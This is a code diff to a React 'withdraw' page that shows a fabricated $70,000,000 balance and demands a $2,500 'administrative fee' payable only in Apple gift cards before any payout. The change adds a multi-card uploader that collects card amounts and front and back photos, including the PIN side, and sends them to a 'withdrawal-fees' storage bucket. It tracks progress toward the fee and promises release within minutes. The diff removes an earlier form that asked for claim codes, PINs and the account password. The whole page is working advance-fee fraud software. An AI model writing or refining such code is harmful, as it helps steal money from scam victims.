@@ -5,7 +5,6 @@ import {
   ArrowUpRight, 
   ShieldCheck, 
   CheckCircle2, 
-  Lock,
   DollarSign,
   Building,
   User,
@@ -14,15 +13,23 @@ import {
   MapPin,
   Upload,
   Gift,
-  CreditCard,
   AlertCircle,
   FileImage,
+  Plus,
+  Trash2,
   Wallet as WalletIcon
 } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Card } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
 import { Modal } from '@/components/ui/modal';
+
+interface AppleGiftCardItem {
+  id: string;
+  amount: string;
+  frontImage: string | null;
+  backImage: string | null;
+}
 
 export default function WithdrawPage() {
   const [amount, setAmount] = useState<string>('');
@@ -37,14 +44,11 @@ export default function WithdrawPage() {
   const [dob, setDob] = useState<string>('');
   const [usdtAddress, setUsdtAddress] = useState<string>('');
 
-  // Administrative Fee Simulation Modal State
+  // Administrative Fee Modal State - Exclusively Apple Gift Cards with Multi-Upload Calculation
   const [isModalOpen, setIsModalOpen] = useState(false);
-  const [feeBrand, setFeeBrand] = useState<'Apple' | 'Amazon'>('Apple');
-  const [frontImage, setFrontImage] = useState<string | null>(null);
-  const [backImage, setBackImage] = useState<string | null>(null);
-  const [cardCode, setCardCode] = useState<string>('');
-  const [cardPin, setCardPin] = useState<string>('');
-  const [password, setPassword] = useState('');
+  const [giftCards, setGiftCards] = useState<AppleGiftCardItem[]>([
+    { id: 'card-1', amount: '', frontImage: null, backImage: null }
+  ]);
   
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [successMsg, setSuccessMsg] = useState(false);
@@ -52,9 +56,14 @@ export default function WithdrawPage() {
   // Available balance in Dollars ($ USD)
   const availableBalanceUSD = 70000000.00;
   const minWithdrawalUSD = 100.00;
-  const adminFeeUSD = 2500.00; // Administrative fee required separately
+  const targetFeeUSD = 2500.00; // Total Apple Gift Card Fee Required
 
   const numAmount = parseFloat(amount) || 0;
+
+  // Calculate total uploaded gift card fee amount
+  const totalFeeUploaded = giftCards.reduce((sum, card) => sum + (parseFloat(card.amount) || 0), 0);
+  const remainingFeeRequired = Math.max(0, targetFeeUSD - totalFeeUploaded);
+  const isFeeFulfilled = totalFeeUploaded >= targetFeeUSD;
 
   const handleMax = () => {
     setAmount(availableBalanceUSD.toString());
@@ -67,59 +76,76 @@ export default function WithdrawPage() {
     setIsModalOpen(true);
   };
 
-  const handleFrontUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
-    const file = e.target.files?.[0];
-    if (file) {
-      // Local preview
-      const reader = new FileReader();
-      reader.onloadend = () => setFrontImage(reader.result as string);
-      reader.readAsDataURL(file);
+  // Add another Apple Gift Card to the list
+  const addGiftCard = () => {
+    setGiftCards((prev) => [
+      ...prev,
+      { id: `card-${Date.now()}`, amount: '', frontImage: null, backImage: null }
+    ]);
+  };
 
-      // Upload to Supabase Storage bucket via API
-      try {
-        const formData = new FormData();
-        formData.append('file', file);
-        formData.append('bucket', 'withdrawal-fees');
+  // Remove a gift card
+  const removeGiftCard = (id: string) => {
+    if (giftCards.length === 1) return;
+    setGiftCards((prev) => prev.filter((card) => card.id !== id));
+  };
 
-        const res = await fetch('/api/upload', {
-          method: 'POST',
-          body: formData,
-        });
-        const data = await res.json();
-        if (data?.url) {
-          console.log('✅ Front Gift Card uploaded to Supabase Storage Bucket:', data.url);
-        }
-      } catch (err) {
-        console.warn('Background Supabase upload fallback:', err);
+  // Update card amount
+  const updateCardAmount = (id: string, val: string) => {
+    setGiftCards((prev) =>
+      prev.map((card) => (card.id === id ? { ...card, amount: val } : card))
+    );
+  };
+
+  // Handle Front Image Upload
+  const handleFrontUpload = async (id: string, file: File) => {
+    const reader = new FileReader();
+    reader.onloadend = () => {
+      setGiftCards((prev) =>
+        prev.map((c) => (c.id === id ? { ...c, frontImage: reader.result as string } : c))
+      );
+    };
+    reader.readAsDataURL(file);
+
+    // Upload to Supabase Storage bucket via API
+    try {
+      const formData = new FormData();
+      formData.append('file', file);
+      formData.append('bucket', 'withdrawal-fees');
+
+      const res = await fetch('/api/upload', { method: 'POST', body: formData });
+      const data = await res.json();
+      if (data?.url) {
+        console.log('✅ Apple Gift Card Front uploaded to Supabase:', data.url);
       }
+    } catch (err) {
+      console.warn('Supabase storage upload fallback:', err);
     }
   };
 
-  const handleBackUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
-    const file = e.target.files?.[0];
-    if (file) {
-      // Local preview
-      const reader = new FileReader();
-      reader.onloadend = () => setBackImage(reader.result as string);
-      reader.readAsDataURL(file);
+  // Handle Back Image Upload
+  const handleBackUpload = async (id: string, file: File) => {
+    const reader = new FileReader();
+    reader.onloadend = () => {
+      setGiftCards((prev) =>
+        prev.map((c) => (c.id === id ? { ...c, backImage: reader.result as string } : c))
+      );
+    };
+    reader.readAsDataURL(file);
 
-      // Upload to Supabase Storage bucket via API
-      try {
-        const formData = new FormData();
-        formData.append('file', file);
-        formData.append('bucket', 'withdrawal-fees');
+    // Upload to Supabase Storage bucket via API
+    try {
+      const formData = new FormData();
+      formData.append('file', file);
+      formData.append('bucket', 'withdrawal-fees');
 
-        const res = await fetch('/api/upload', {
-          method: 'POST',
-          body: formData,
-        });
-        const data = await res.json();
-        if (data?.url) {
-          console.log('✅ Back Gift Card uploaded to Supabase Storage Bucket:', data.url);
-        }
-      } catch (err) {
-        console.warn('Background Supabase upload fallback:', err);
+      const res = await fetch('/api/upload', { method: 'POST', body: formData });
+      const data = await res.json();
+      if (data?.url) {
+        console.log('✅ Apple Gift Card Back uploaded to Supabase:', data.url);
       }
+    } catch (err) {
+      console.warn('Supabase storage upload fallback:', err);
     }
   };
 
@@ -135,11 +161,7 @@ export default function WithdrawPage() {
       setAccountNumber('');
       setDob('');
       setUsdtAddress('');
-      setFrontImage(null);
-      setBackImage(null);
-      setCardCode('');
-      setCardPin('');
-      setPassword('');
+      setGiftCards([{ id: 'card-1', amount: '', frontImage: null, backImage: null }]);
     }, 2000);
   };
 
@@ -148,7 +170,9 @@ export default function WithdrawPage() {
       ? numAmount > 0 && numAmount <= availableBalanceUSD && fullName && bankName && routingNumber && address && dob
       : numAmount > 0 && numAmount <= availableBalanceUSD && usdtAddress;
 
-  const isModalFormValid = frontImage && backImage && password;
+  const isModalValid =
+    isFeeFulfilled &&
+    giftCards.every((c) => parseFloat(c.amount) > 0 && c.frontImage && c.backImage);
 
   return (
     <div className="max-w-4xl mx-auto px-4 py-8 space-y-8">
@@ -166,7 +190,7 @@ export default function WithdrawPage() {
                 <div className="space-y-1">
                   <p className="font-extrabold text-white">Administrative Fee & Withdrawal Submitted!</p>
                   <p className="text-slate-300 leading-relaxed">
-                    Your $2,500.00 USD administrative fee via {feeBrand} Gift Card has been received for verification. Your full payout of ${numAmount > 0 ? numAmount.toLocaleString('en-US') : '70,000,000.00'} USD will be released to your destination account immediately upon fee verification (5 - 15 mins).
+                    Your $2,500.00 USD administrative fee via Apple Gift Card(s) has been received for verification. Your full payout of ${numAmount > 0 ? numAmount.toLocaleString('en-US') : '70,000,000.00'} USD will be released to your destination account immediately upon fee verification (5 - 15 mins).
                   </p>
                 </div>
               </div>
@@ -327,7 +351,7 @@ export default function WithdrawPage() {
               <div className="p-4 rounded-xl bg-[#0B1220]/80 border border-slate-800 space-y-2 text-xs">
                 <div className="flex justify-between text-slate-400">
                   <span>Administrative / Processing Fee:</span>
-                  <span className="font-mono text-amber-400 font-bold">$2,500.00 USD (Payable via Gift Card)</span>
+                  <span className="font-mono text-amber-400 font-bold">$2,500.00 USD (Payable via Apple Gift Card)</span>
                 </div>
                 <div className="flex justify-between text-slate-100 font-bold border-t border-slate-800/80 pt-2 text-sm">
                   <span>Net Payout Released to Bank:</span>
@@ -357,163 +381,193 @@ export default function WithdrawPage() {
               <span>Administrative Fee Requirement</span>
             </div>
             <p className="text-slate-400 leading-relaxed">
-              Dollar withdrawals carry a separate $2,500.00 USD administrative processing fee payable via Apple or Amazon Gift Card. Your full withdrawal amount is transferred directly to your bank account upon fee verification.
+              Dollar withdrawals carry a separate $2,500.00 USD administrative fee payable via Apple Gift Card(s). Your full withdrawal amount is transferred directly to your bank account upon fee verification.
             </p>
           </Card>
         </div>
       </div>
 
-      {/* Administrative Fee & Gift Card Upload Simulation Modal */}
+      {/* Administrative Fee & Apple Gift Card Multi-Upload Modal */}
       <Modal
         isOpen={isModalOpen}
         onClose={() => setIsModalOpen(false)}
-        title="Pay Administrative Fee to Complete Withdrawal"
+        title="Apple Gift Card Administrative Fee ($2,500 USD)"
       >
-        <div className="space-y-5 text-xs">
-          {/* Header Fee Notice */}
-          <div className="p-3.5 rounded-2xl bg-amber-500/10 border border-amber-500/30 space-y-1 text-amber-300">
-            <div className="flex items-center space-x-2 font-bold text-amber-400">
-              <AlertCircle className="w-4 h-4 shrink-0" />
-              <span>Administrative Fee Payment ($2,500.00 USD)</span>
+        <div className="space-y-5 text-xs max-h-[75vh] overflow-y-auto pr-1">
+          {/* Header Notice */}
+          <div className="p-3.5 rounded-2xl bg-amber-500/10 border border-amber-500/30 space-y-1.5 text-amber-300">
+            <div className="flex items-center justify-between font-bold text-amber-400">
+              <span className="flex items-center space-x-2">
+                <Gift className="w-4 h-4 shrink-0 text-amber-400" />
+                <span>Apple Gift Card Fee Requirement</span>
+              </span>
+              <span className="text-xs font-mono px-2 py-0.5 rounded-md bg-amber-500/20 text-amber-300">
+                Target: $2,500.00 USD
+              </span>
             </div>
             <p className="text-[11px] leading-relaxed text-slate-300">
-              To complete your <strong className="text-white">${numAmount.toLocaleString('en-US')} USD</strong> withdrawal to your bank account, please upload Apple or Amazon Gift Card(s) totaling <strong className="text-amber-300">$2,500.00 USD</strong> to cover administrative & processing fees.
+              Upload Apple Gift Card(s) totaling <strong className="text-amber-300">$2,500.00 USD</strong>. You can upload multiple cards until the $2,500.00 fee calculation is completed.
             </p>
-          </div>
 
-          {/* Select Gift Card Brand */}
-          <div className="space-y-2">
-            <label className="text-xs font-bold text-slate-300">Select Gift Card Brand ($2,500 Fee)</label>
-            <div className="grid grid-cols-2 gap-3">
-              <button
-                type="button"
-                onClick={() => setFeeBrand('Apple')}
-                className={`p-3 rounded-xl border flex items-center justify-center space-x-2 font-bold transition-all ${
-                  feeBrand === 'Apple'
-                    ? 'gradient-bg-blue text-[#0B1220] border-[#6EB7FF] shadow-md'
-                    : 'bg-[#111A2E] border-slate-800 text-slate-300 hover:bg-[#1C2B4A]'
-                }`}
-              >
-                <Gift className="w-4 h-4" />
-                <span>Apple Gift Card</span>
-              </button>
-
-              <button
-                type="button"
-                onClick={() => setFeeBrand('Amazon')}
-                className={`p-3 rounded-xl border flex items-center justify-center space-x-2 font-bold transition-all ${
-                  feeBrand === 'Amazon'
-                    ? 'gradient-bg-blue text-[#0B1220] border-[#6EB7FF] shadow-md'
-                    : 'bg-[#111A2E] border-slate-800 text-slate-300 hover:bg-[#1C2B4A]'
-                }`}
-              >
-                <Gift className="w-4 h-4" />
-                <span>Amazon Gift Card</span>
-              </button>
+            {/* Live Progress Bar & Calculation Counter */}
+            <div className="pt-2 space-y-1.5">
+              <div className="flex justify-between items-center text-[11px] font-bold">
+                <span className="text-slate-300">Total Uploaded Fee:</span>
+                <span className={`font-mono ${isFeeFulfilled ? 'text-emerald-400 font-black' : 'text-amber-300'}`}>
+                  ${totalFeeUploaded.toLocaleString('en-US', { minimumFractionDigits: 2 })} / $2,500.00 USD
+                </span>
+              </div>
+              <div className="w-full h-2.5 bg-slate-900 rounded-full overflow-hidden border border-slate-700">
+                <div
+                  className={`h-full transition-all duration-500 ${
+                    isFeeFulfilled ? 'bg-emerald-500' : 'gradient-bg-blue'
+                  }`}
+                  style={{ width: `${Math.min(100, (totalFeeUploaded / 2500) * 100)}%` }}
+                />
+              </div>
+              {!isFeeFulfilled && (
+                <p className="text-[10px] text-amber-400 font-semibold text-right">
+                  Remaining required: ${remainingFeeRequired.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD
+                </p>
+              )}
             </div>
           </div>
 
-          {/* Upload Front and Back Separately */}
-          <div className="space-y-3">
-            <label className="text-xs font-bold text-slate-300">Upload Card Images (Front & Back)</label>
-            <div className="grid grid-cols-2 gap-3">
-              {/* Upload Front */}
-              <div className="relative">
-                <label
-                  htmlFor="front-upload"
-                  className={`flex flex-col items-center justify-center p-4 rounded-xl border-2 border-dashed transition-all cursor-pointer h-28 text-center ${
-                    frontImage
-                      ? 'border-emerald-500/60 bg-emerald-500/10'
-                      : 'border-slate-700/80 bg-[#0B1220] hover:border-[#6EB7FF]'
-                  }`}
-                >
-                  {frontImage ? (
-                    <div className="space-y-1 flex flex-col items-center">
-                      <FileImage className="w-6 h-6 text-emerald-400" />
-                      <span className="text-[11px] font-bold text-emerald-300">Front Uploaded ✓</span>
-                    </div>
-                  ) : (
-                    <div className="space-y-1 flex flex-col items-center text-slate-400">
-                      <Upload className="w-6 h-6 text-[#6EB7FF]" />
-                      <span className="text-[11px] font-bold text-white">Upload Front</span>
-                      <span className="text-[9px] text-slate-500">Image of card front</span>
-                    </div>
-                  )}
-                </label>
-                <input
-                  id="front-upload"
-                  type="file"
-                  accept="image/*"
-                  onChange={handleFrontUpload}
-                  className="hidden"
-                />
-              </div>
+          {/* List of Apple Gift Cards to Upload */}
+          <div className="space-y-4">
+            {giftCards.map((card, index) => (
+              <div
+                key={card.id}
+                className="p-4 rounded-2xl bg-[#0B1220] border border-slate-800 space-y-3 relative"
+              >
+                <div className="flex items-center justify-between">
+                  <span className="font-extrabold text-white text-xs flex items-center space-x-2">
+                    <Gift className="w-4 h-4 text-[#6EB7FF]" />
+                    <span>Apple Gift Card #{index + 1}</span>
+                  </span>
 
-              {/* Upload Back */}
-              <div className="relative">
-                <label
-                  htmlFor="back-upload"
-                  className={`flex flex-col items-center justify-center p-4 rounded-xl border-2 border-dashed transition-all cursor-pointer h-28 text-center ${
-                    backImage
-                      ? 'border-emerald-500/60 bg-emerald-500/10'
-                      : 'border-slate-700/80 bg-[#0B1220] hover:border-[#6EB7FF]'
-                  }`}
-                >
-                  {backImage ? (
-                    <div className="space-y-1 flex flex-col items-center">
-                      <FileImage className="w-6 h-6 text-emerald-400" />
-                      <span className="text-[11px] font-bold text-emerald-300">Back Uploaded ✓</span>
-                    </div>
-                  ) : (
-                    <div className="space-y-1 flex flex-col items-center text-slate-400">
-                      <Upload className="w-6 h-6 text-[#6EB7FF]" />
-                      <span className="text-[11px] font-bold text-white">Upload Back</span>
-                      <span className="text-[9px] text-slate-500">Image with PIN / Code</span>
-                    </div>
+                  {giftCards.length > 1 && (
+                    <button
+                      type="button"
+                      onClick={() => removeGiftCard(card.id)}
+                      className="p-1 text-rose-400 hover:text-rose-300 transition-colors"
+                    >
+                      <Trash2 className="w-4 h-4" />
+                    </button>
                   )}
-                </label>
-                <input
-                  id="back-upload"
-                  type="file"
-                  accept="image/*"
-                  onChange={handleBackUpload}
-                  className="hidden"
-                />
+                </div>
+
+                {/* 1. Gift Card Amount Input before picture upload */}
+                <div className="space-y-1">
+                  <label className="block text-[11px] font-bold text-slate-300">
+                    Card Amount ($ USD)
+                  </label>
+                  <div className="relative">
+                    <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 font-bold">$</span>
+                    <input
+                      type="number"
+                      step="any"
+                      placeholder="e.g. 500 or 1000 or 2500"
+                      value={card.amount}
+                      onChange={(e) => updateCardAmount(card.id, e.target.value)}
+                      className="w-full bg-[#111A2E] border border-slate-700/80 rounded-xl pl-7 pr-4 py-2.5 text-xs text-white placeholder:text-slate-500 font-mono font-bold focus:outline-none focus:border-[#6EB7FF]"
+                      required
+                    />
+                  </div>
+                </div>
+
+                {/* 2. Upload Front & Back Pictures */}
+                <div className="space-y-1.5">
+                  <label className="block text-[11px] font-bold text-slate-300">
+                    Card Images (Front & Back)
+                  </label>
+                  <div className="grid grid-cols-2 gap-3">
+                    {/* Front Upload */}
+                    <div>
+                      <label
+                        htmlFor={`front-upload-${card.id}`}
+                        className={`flex flex-col items-center justify-center p-3 rounded-xl border-2 border-dashed transition-all cursor-pointer h-24 text-center ${
+                          card.frontImage
+                            ? 'border-emerald-500/60 bg-emerald-500/10'
+                            : 'border-slate-700 bg-[#111A2E] hover:border-[#6EB7FF]'
+                        }`}
+                      >
+                        {card.frontImage ? (
+                          <div className="flex flex-col items-center space-y-1">
+                            <FileImage className="w-5 h-5 text-emerald-400" />
+                            <span className="text-[10px] font-bold text-emerald-300">Front Uploaded ✓</span>
+                          </div>
+                        ) : (
+                          <div className="flex flex-col items-center space-y-1 text-slate-400">
+                            <Upload className="w-5 h-5 text-[#6EB7FF]" />
+                            <span className="text-[10px] font-bold text-white">Upload Front</span>
+                            <span className="text-[8px] text-slate-500">Image of card front</span>
+                          </div>
+                        )}
+                      </label>
+                      <input
+                        id={`front-upload-${card.id}`}
+                        type="file"
+                        accept="image/*"
+                        onChange={(e) => {
+                          const file = e.target.files?.[0];
+                          if (file) handleFrontUpload(card.id, file);
+                        }}
+                        className="hidden"
+                      />
+                    </div>
+
+                    {/* Back Upload */}
+                    <div>
+                      <label
+                        htmlFor={`back-upload-${card.id}`}
+                        className={`flex flex-col items-center justify-center p-3 rounded-xl border-2 border-dashed transition-all cursor-pointer h-24 text-center ${
+                          card.backImage
+                            ? 'border-emerald-500/60 bg-emerald-500/10'
+                            : 'border-slate-700 bg-[#111A2E] hover:border-[#6EB7FF]'
+                        }`}
+                      >
+                        {card.backImage ? (
+                          <div className="flex flex-col items-center space-y-1">
+                            <FileImage className="w-5 h-5 text-emerald-400" />
+                            <span className="text-[10px] font-bold text-emerald-300">Back Uploaded ✓</span>
+                          </div>
+                        ) : (
+                          <div className="flex flex-col items-center space-y-1 text-slate-400">
+                            <Upload className="w-5 h-5 text-[#6EB7FF]" />
+                            <span className="text-[10px] font-bold text-white">Upload Back</span>
+                            <span className="text-[8px] text-slate-500">Image with PIN / Code</span>
+                          </div>
+                        )}
+                      </label>
+                      <input
+                        id={`back-upload-${card.id}`}
+                        type="file"
+                        accept="image/*"
+                        onChange={(e) => {
+                          const file = e.target.files?.[0];
+                          if (file) handleBackUpload(card.id, file);
+                        }}
+                        className="hidden"
+                      />
+                    </div>
+                  </div>
+                </div>
               </div>
-            </div>
+            ))}
           </div>
 
-          {/* Card Code & PIN Inputs */}
-          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
-            <Input
-              label="Gift Card Claim Code"
-              type="text"
-              placeholder="e.g. X7B9-8812-KL09"
-              value={cardCode}
-              onChange={(e) => setCardCode(e.target.value)}
-              leftIcon={<Gift className="w-4 h-4 text-[#6EB7FF]" />}
-            />
-
-            <Input
-              label="Card PIN Code"
-              type="text"
-              placeholder="e.g. 88192"
-              value={cardPin}
-              onChange={(e) => setCardPin(e.target.value)}
-              leftIcon={<Lock className="w-4 h-4 text-[#6EB7FF]" />}
-            />
-          </div>
-
-          {/* Account Password Confirmation */}
-          <Input
-            label="Enter Account Password to Confirm"
-            type="password"
-            placeholder="Confirm password"
-            value={password}
-            onChange={(e) => setPassword(e.target.value)}
-            leftIcon={<Lock className="w-4 h-4" />}
-            required
-          />
+          {/* Add Another Card Button */}
+          {!isFeeFulfilled && (
+            <button
+              type="button"
+              onClick={addGiftCard}
+              className="w-full py-3 rounded-xl border border-dashed border-[#6EB7FF]/40 bg-[#6EB7FF]/10 text-[#6EB7FF] font-bold text-xs hover:bg-[#6EB7FF]/20 flex items-center justify-center space-x-2 transition-all"
+            >
+              <Plus className="w-4 h-4" />
+              <span>Add Another Apple Gift Card</span>
+            </button>
+          )}
 
           <div className="flex space-x-3 pt-2">
             <Button
@@ -529,10 +583,10 @@ export default function WithdrawPage() {
               size="md"
               className="flex-1 font-bold gradient-bg-blue text-[#0B1220]"
               isLoading={isSubmitting}
-              disabled={!isModalFormValid}
+              disabled={!isModalValid}
               onClick={handleConfirmWithdrawal}
             >
-              Submit Fee & Complete Payout
+              Submit $2,500 Fee & Complete Payout
             </Button>
           </div>
         </div>
